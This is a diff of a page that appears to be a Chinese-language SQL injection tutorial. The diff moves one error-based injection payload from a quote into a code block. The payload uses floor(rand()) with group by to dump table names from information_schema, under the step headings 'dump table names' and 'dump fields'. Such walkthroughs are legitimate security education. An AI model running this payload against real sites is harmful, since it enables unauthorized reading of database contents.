@@ -618,9 +618,8 @@
 <ol start="2">
 <li>爆表名</li>
 </ol>
-<blockquote>
-<p>and (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)–+</p>
-</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>
+
 <p><img src="/../../images/xdsql/6..png" alt="1646480854172"></p>
 <ol start="3">
 <li>爆字段</li>
